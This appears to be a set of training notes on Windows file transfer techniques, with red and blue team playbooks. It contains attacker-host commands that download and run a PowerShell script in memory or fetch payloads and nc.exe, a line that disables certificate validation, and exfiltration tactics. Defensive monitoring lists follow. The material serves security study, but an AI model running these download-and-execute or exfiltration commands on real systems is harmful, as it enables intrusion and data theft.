# Windows File Transfer Methods

**Technical Report, Red Team Playbooks, and Blue Team Playbooks**

## 1. Technical Report: File Transfer Techniques on Windows Systems

## 1.1 Why Windows File Transfer Knowledge Matters

Windows environments dominate enterprise networks, making Windows file transfer mechanisms a **primary battleground** for both attackers and defenders. Modern Windows versions ship with a wide range of native utilities that can:

* Download files
* Upload data
* Execute payloads directly in memory
* Bypass traditional perimeter controls

These mechanisms are often:

* Trusted
* Signed
* Expected in normal administrative workflows

This makes them ideal for abuse during post-exploitation and lateral movement phases.

---

## 1.2 Fileless Attacks and the Astaroth Case Study

The module uses the **Astaroth APT** as a real-world illustration of advanced file transfer abuse.

Key characteristics of the attack:

* Delivered via spear-phishing
* Used a malicious LNK file
* Leveraged **WMIC**, **Bitsadmin**, **Certutil**, and **regsvr32**
* Avoided writing obvious payloads to disk
* Executed code primarily in memory

Despite being labeled “fileless,” the attack **still relied on file transfer**—the payloads were simply staged, encoded, and executed using native tools instead of traditional executables.

The lesson:

> *“Fileless” does not mean “file-free.”*

---

## 1.3 Base64 Encoding and Decoding (Offline Transfers)

### Concept

When network transfer is restricted or monitored, files can be transferred manually using **base64 encoding**.

Workflow:

1. Encode a file to base64 on the attacker system
2. Copy/paste the encoded string
3. Decode it on the target system
4. Verify integrity with hashes (MD5)

### PowerShell Decode Example

```powershell
[IO.File]::WriteAllBytes(
  "C:\Users\Public\file.bin",
  [Convert]::FromBase64String("<base64-data>")
)
```

### Integrity Verification

* Linux: `md5sum`
* Windows: `Get-FileHash`

### Limitations

* `cmd.exe` max string length ≈ 8,191 characters
* Large payloads are impractical
* Web shells may truncate large strings

---

## 1.4 PowerShell Web Downloads

PowerShell provides multiple built-in download mechanisms.

### Net.WebClient Methods

Commonly abused methods include:

* `DownloadFile`
* `DownloadString`
* Async variants for stealth

Example:

```powershell
(New-Object Net.WebClient).DownloadFile(
  "http://<ip>/payload.exe",
  "C:\Users\Public\payload.exe"
)
```

---

### Fileless PowerShell Execution

PowerShell supports **in-memory execution**:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://<ip>/script.ps1")
```

This avoids touching disk and reduces forensic artifacts.

---

### Invoke-WebRequest (IWR)

Available from PowerShell 3.0+.

Issues addressed in the module:

* Internet Explorer first-launch errors
* TLS trust failures

Workarounds:

* `-UseBasicParsing`
* Overriding certificate validation

---

## 1.5 Common PowerShell Errors and Bypasses

### IE Engine Dependency

Invoke-WebRequest may fail if IE is uninitialized.

Bypass:

```powershell
Invoke-WebRequest <url> -UseBasicParsing
```

---

### SSL/TLS Trust Errors

If certificates are untrusted:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

This disables certificate validation entirely.

---

## 1.6 SMB Downloads (TCP/445)

SMB is heavily used in enterprise networks and often allowed internally.

### Attacker SMB Server

Using Impacket:

```bash
impacket-smbserver share /tmp/smbshare -smb2support
```

### Windows Download

```cmd
copy \\<attacker-ip>\share\nc.exe
```

---

### Authenticated SMB

Modern Windows blocks unauthenticated guest access.

Solution:

* Configure SMB server with username/password
* Mount share using `net use`

---

## 1.7 FTP Downloads

FTP uses TCP ports **21/20** and is often restricted but still appears in legacy environments.

### Python FTP Server

```bash
python3 -m pyftpdlib --port 21
```

### PowerShell FTP Download

```powershell
(New-Object Net.WebClient).DownloadFile(
  "ftp://<ip>/file.txt",
  "C:\Users\Public\file.txt"
)
```

---

### Non-Interactive FTP

When shells are limited, command files can automate FTP transfers.

---

## 1.8 Upload Operations (Exfiltration)

File transfer is bidirectional. Uploads are critical for:

* Credential harvesting
* Password cracking
* Source code theft
* Evidence exfiltration

---

## 1.9 PowerShell Base64 Uploads

Reverse of download method:

```powershell
[Convert]::ToBase64String(
  (Get-Content file -Encoding byte)
)
```

Decoded on attacker system and verified with hashes.

---

## 1.10 PowerShell Web Uploads

PowerShell lacks native upload cmdlets but can use:

* `Invoke-WebRequest`
* `Invoke-RestMethod`

The module demonstrates:

* Python `uploadserver`
* Custom PowerShell upload scripts

---

## 1.11 SMB Uploads

Using SMB shares or **WebDAV over HTTP**.

### WebDAV Key Insight

* Windows will try SMB first
* Falls back to HTTP (WebDAV) if SMB fails
* Uses `DavWWWRoot` pseudo-directory

This allows file transfer over **HTTP/HTTPS**, often bypassing egress filtering.

---

## 1.12 FTP Uploads

FTP servers must allow write access:

```bash
python3 -m pyftpdlib --port 21 --write
```

Uploads performed via:

* PowerShell
* FTP command files

---

## 1.13 Core Takeaways

* Windows includes many native file transfer tools
* “Fileless” attacks still involve file movement
* Base64 enables offline transfer
* PowerShell is extremely flexible and dangerous
* SMB and WebDAV are common blind spots
* Uploads are as important as downloads

---

# 2. Red Team Playbooks

---

## Red Team Playbook 1: File Transfer Selection Matrix

**Objective:**
Select the best transfer method based on constraints.

**Decision Factors:**

* PowerShell allowed?
* HTTP/HTTPS filtered?
* SMB outbound allowed?
* Interactive shell available?

Always test **capability, not policy**.

---

## Red Team Playbook 2: Fileless Payload Delivery

**Objective:**
Avoid disk artifacts.

**Techniques:**

* PowerShell `DownloadString | IEX`
* Certutil decode + regsvr32
* Reflective DLL loading

Diskless ≠ traceless, but it raises the bar.

---

## Red Team Playbook 3: SMB & WebDAV Abuse

**Objective:**
Exploit trusted enterprise protocols.

**Approach:**

* Host SMB/WebDAV servers
* Blend into normal Windows traffic
* Use authenticated shares when required

SMB/WebDAV often bypass perimeter defenses.

---

## Red Team Playbook 4: Data Exfiltration

**Objective:**
Remove sensitive data quietly.

**Techniques:**

* Base64 over HTTP
* WebDAV uploads
* FTP where legacy systems exist

Small, frequent uploads beat large noisy transfers.

---

# 3. Blue Team Playbooks

---

## Blue Team Playbook 1: LOLBin Monitoring

**Objective:**
Detect abuse of native tools.

**High-Risk Binaries:**

* powershell.exe
* certutil.exe
* bitsadmin.exe
* regsvr32.exe
* wmic.exe

Monitor execution context, not just execution.

---

## Blue Team Playbook 2: Network Egress Control

**Objective:**
Prevent unauthorized transfers.

**Controls:**

* Block outbound SMB
* Restrict WebDAV
* Inspect HTTP POST traffic
* Enforce proxy usage

Egress filtering is a **primary control**, not optional.

---

## Blue Team Playbook 3: PowerShell Hardening

**Objective:**
Reduce abuse surface.

**Actions:**

* Constrained Language Mode
* Script Block Logging
* AMSI enforcement
* Disable legacy PowerShell versions

Most attacks rely on PowerShell misconfiguration.

---

## Blue Team Playbook 4: Detection via Behavior

**Objective:**
Catch attackers who “live off the land.”

**Indicators:**

* Base64 encoding activity
* Unexpected file writes to Public or Temp
* SMB/WebDAV connections from servers
* PowerShell downloading from raw IPs

Behavioral detection beats signature-based detection.

---

## Summary

* Windows offers many native file transfer paths
* Attackers abuse trusted tools to evade defenses
* Fileless attacks still require file movement
* SMB, WebDAV, and PowerShell are recurring themes
* Defenders must monitor *how* tools are used
* Mastery requires hands-on experimentation

